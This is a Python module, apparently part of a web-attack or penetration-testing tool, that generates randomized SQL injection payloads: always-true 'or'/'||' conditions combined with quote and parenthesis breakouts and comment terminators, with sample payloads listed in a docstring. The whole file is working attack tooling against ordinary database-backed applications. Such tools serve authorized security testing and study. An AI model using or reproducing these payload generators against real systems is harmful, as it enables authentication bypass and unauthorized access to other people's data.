from cores.actions import randomFromList, srand

def truecon():
	# Generate true condition of SQL query
	"""
	Equal:
		' or '1'='1' -- --
	Static:
		1' or not false #
		1' or true #
	Compare:
		1' or 12 rlike 12 #
		2' or '2'>'0' -- --
		2' or 2>0 -- --
	"""
	# Payload template: ['or' | '||'] [condition] 
	def cCon():
		return randomFromList(["or", "||"])
	def sCon():
		conType = randomFromList(["equal", "static", "compare"])
		# Could be faster than create a dict and call element from dict
		if conType == "static":
			return randomFromList(["not false", "true"])

		elif conType == "compare":
			genType = randomFromList(["like", "rlike", "not like", "gl"])
		
			if genType == "gl":
				_stri1, _stri2 = srand(stype = "dig"), srand(stype = "dig")
				if int(_stri1) > int(_stri2):
					return "%s > %s" %(_stri1, _stri2)
				else:
					return "%s > %s" %(_stri2, _stri1)
		
			elif genType == "not like":
				while True:
					_stri1, _stri2 = srand(stype = "char"), srand(stype = "char")
					# MAKE SURE WE ARE HAVING NOT LIKE
					if _stri1 != _stri2:
						break
				return "'%s' %s '%s'" %(_stri1, genType, _stri2)
		
			else:
				_stri = srand(min = 3, max = 5, stype = "char")
				return "'%s' %s '%s'" %(_stri, genType, _stri)

		elif conType == "equal":
			genType = randomFromList(["char", "dig"])
			_stri = srand(min = 3, max = 5, stype = genType)
			if genType == "char":
				return "'%s'='%s'" %(_stri, _stri)
			elif genType == "dig":
				return "%s=%s" %(_stri, _stri)

	return "%s %s" %(cCon(), sCon())

def sPayload():
	def sEnd():
		return randomFromList(["-- --", "#", "--"])
	# Generate random SQL injection payload
	# Payload template: [X / X' / X')] [True condition] [-- / #]

	fchar = ["", "'", ")", "')", "'))", "))"]

	for pchar in fchar:
		yield "%s %s %s" %(pchar, truecon(), sEnd())